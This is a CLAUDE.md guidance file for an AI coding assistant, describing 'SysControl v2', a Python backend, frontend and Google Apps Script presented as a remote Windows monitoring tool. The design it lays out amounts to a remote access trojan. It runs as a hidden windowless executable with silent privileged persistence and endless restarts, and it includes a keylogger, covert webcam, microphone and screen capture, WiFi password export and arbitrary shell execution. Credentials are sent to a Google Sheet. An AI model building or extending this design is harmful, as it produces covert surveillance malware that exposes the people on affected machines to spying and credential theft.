# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What This Is

SysControl v2 is a remote system monitoring tool for Windows. A Python HTTP backend runs on target laptops, exposes a JWT-authenticated API over Cloudflare Quick Tunnels, and a static frontend (deployed to Netlify) auto-discovers devices via a Google Apps Script web app backed by Google Sheets.

## Commands

### Development
```powershell
cd backend
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
python server.py              # starts on http://localhost:5000
```

Or use the shortcut: `backend\install.bat`

### Build .exe
```powershell
cd backend
build.bat                     # outputs dist\SystemMonitor.exe
```
This installs PyInstaller into the venv, bundles everything into a single windowless .exe. Hidden imports include all feature modules, cv2, and numpy.

### Deploy Frontend
Drag-and-drop `frontend/` folder to Netlify, or:
```bash
netlify deploy --prod --dir frontend
```

### No tests or linter configured.

## Architecture

```
Frontend (Netlify)  <-->  Google Apps Script (device registry)  <-->  Backend (each laptop)
        \                                                              /
         \------------- direct HTTPS via tunnel ----------------------/
```

**Flow:** Backend starts → `startup.auto_setup()` registers for Windows auto-start (Task Scheduler + Registry) → auto-configures (hostname as device name, random password, random JWT secret) → spawns Cloudflare Quick Tunnel → registers tunnel URL + password to Google Apps Script → sends heartbeat every 3 minutes with fresh tunnel URL. Frontend requires user login (credentials in "Users" Google Sheet). After login, frontend auto-pings all devices on load → user selects online device → auto-connects using stored password (no manual password entry) → gets JWT → all subsequent API calls go directly to the laptop over the tunnel.

### Backend (`backend/`)

Built on Python's stdlib `http.server.ThreadingHTTPServer` — no framework. All routing is manual path-matching in `do_GET`/`do_POST` inside `server.py`. Crash recovery via `safe_main()` wrapper retries forever with 10s delay.

- **server.py** — Main HTTP server, all route handling, embedded status page HTML, command dispatch via `_handle_cmd` (18 slash commands including `/startup`). Zero-config: auto-setup on first run. `safe_main()` wraps `main()` for crash recovery.
- **auth.py** — JWT (HS256, 24h expiry) via PyJWT. Secret is a random 64-char hex stored in config as `jwt_secret`.
- **config.py** — Stores config as JSON in Windows Credential Manager via `keyring` (service: "SysControl"). Holds bcrypt hash, plaintext password, device name/ID, JWT secret, version. `auto_setup()` runs on first launch — no user input needed.
- **tunnel.py** — Spawns `cloudflared tunnel` as hidden subprocess, parses stdout for the `trycloudflare.com` URL.
- **registry.py** — Google Apps Script API calls to register device URL on startup. Heartbeat every 3 minutes keeps tunnel URL fresh. Sets `online: false` on shutdown. `GAS_URL` must be set to the deployed web app URL.
- **updater.py** — Checks GitHub Releases every 6h, downloads new .exe, swaps via batch script. Currently disabled (`GITHUB_REPO = ""`).

### Google Apps Script (`gas/`)

- **Code.gs** — The Apps Script code deployed as a web app. Handles register, heartbeat, offline, device listing, user login, and cleanup. Data stored in "Devices" sheet (device registry) and "Users" sheet (frontend auth credentials).
- **SETUP.md** — Step-by-step deployment instructions.

### Feature Modules (`backend/features/`)

Each module is self-contained with no cross-dependencies between features:

- **screen.py** — `mss` + `Pillow`. Three quality tiers (low/med/high) with JPEG quality + scale factors. Adaptive streaming via `/api/screen-live`.
- **webcam.py** — OpenCV (`opencv-python-headless`, no ffmpeg needed). Single capture via `capture_jpeg()` and live streaming via background thread. `start_live()` waits for first frame before returning. Quality tiers with JPEG quality + resolution scaling.
- **shell.py** — `subprocess.Popen(cmd, shell=True)` with CWD tracking. Handles `cd` as a special case.
- **files.py** — Full file operations: browse, read/write, upload/download (base64), rename, delete, mkdir. Whitelist of editable extensions.
- **system.py** — OS info, public IP, clipboard (pyperclip), WiFi passwords (netsh export), lock screen, shutdown.
- **audio.py** — TTS via pyttsx3 (threaded), live mic via sounddevice (16kHz, WAV chunks via queue).
- **keylog.py** — pynput keyboard listener, thread-safe buffer (10K max), special key mapping.
- **startup.py** — Bulletproof Windows auto-start using dual approach: Task Scheduler (`ONLOGON`, `HIGHEST` privilege) + Registry Run key fallback. `auto_setup()` called at top of `main()` — registers silently when running as .exe. Remote control via `/startup`, `/startup on`, `/startup off` commands.

All Windows subprocesses use `CREATE_NO_WINDOW` (0x08000000) + `STARTUPINFO(wShowWindow=0)` to run hidden.

### Frontend (`frontend/`)

Vanilla HTML/JS/CSS, no framework, no build step. Single-page app with screen toggling via `hidden` class.

- **main.js** — All logic: user auth (login/logout via Google Apps Script "Users" sheet), device discovery with auto-ping on load, on-demand live-ping status check, JWT auth, auto-connect using stored passwords (no password modal), 12 overlay/modal managers, API fetch wrappers, adaptive frame polling for live feeds. `GAS_URL` must be set to the deployed web app URL. State in globals (`authUser`, `conn`, `devices`, `live`, `cam`, `mic`, etc.).
- **style.css** — Dark-only theme with CSS custom properties. Mobile-responsive grid.
- **manifest.json** — PWA manifest (installable on phones).

## Key Design Decisions

- **Zero-config backend** — First run auto-creates config: hostname as device name, random password, random JWT secret. No setup page, no user input.
- **Auto-start on boot** — When running as .exe, automatically registers for Windows startup via Task Scheduler (primary) and Registry Run key (fallback). Zero manual action after first run.
- **Crash recovery** — `safe_main()` wraps the server entry point; if `main()` crashes, waits 10s and retries forever. Combined with auto-start, ensures the service is always running.
- **No .env files** — All secrets stored in Windows Credential Manager via keyring, not on disk.
- **No Telegram** — Pure HTTP+JWT replaced the v1 Telegram bot approach.
- **Google Apps Script registry** — Google Apps Script + Google Sheets serves as the device directory and user auth. "Devices" sheet stores device info + passwords (auto-shared by backend). "Users" sheet stores frontend login credentials (manually managed).
- **Heartbeat every 3 minutes** — Backend sends tunnel URL + metadata to GAS registry periodically so the frontend always has the latest tunnel URL after restarts.
- **Auto-connect, no password prompt** — Frontend auto-connects to devices using the password stored in Google Sheets. User never enters a device password. Offline devices show a clear message instead of a login form.
- **Last seen display** — Offline devices show relative time since last heartbeat (e.g., "Offline · last seen 5m ago") via `timeAgo()`.
- **Adaptive live streaming** — Both Live Screen and Live Camera use adaptive polling: next frame is fetched only after the previous one loads, with a configurable delay per quality tier. Naturally adapts to network speed — no request pileup.
- **Webcam via OpenCV** — Uses `opencv-python-headless` (no ffmpeg binary needed). Two buttons: "Webcam" for instant chat screenshot, "Cam" for live camera overlay with L/M/H quality.
- **Frontend auth** — Username/password login via "Users" sheet. Session persists in localStorage. Only manually-added users can access the dashboard.
- **Embedded HTML** — Status page is a raw HTML string inside `server.py`, not a separate file.
- **Any unrecognized command** sent to `/api/cmd` is executed as a shell command (server.py `_handle_cmd`).
- **CORS is `*`** — Intentional, since the frontend is on a different domain (Netlify) and backend is behind a random tunnel URL.

## Port and Config

- Backend always binds port **5000**. On startup it kills any existing process on that port.
- Device ID is a random 12-char hex generated during auto-setup.
- JWT tokens expire after 24 hours; there is no refresh mechanism.
- JWT secret is a random 64-char hex stored in Windows Credential Manager (not derived from password hash).
- Cloudflare tunnel URLs change on every backend restart; heartbeat every 3 minutes keeps GAS registry updated.
- Frontend login credentials stored in "Users" sheet (columns: username, password). Users added manually by sheet owner.
- Quality tiers for live screen and webcam: Low (q45, 50% scale), Med (q70, 75% scale), High (q90, full resolution).
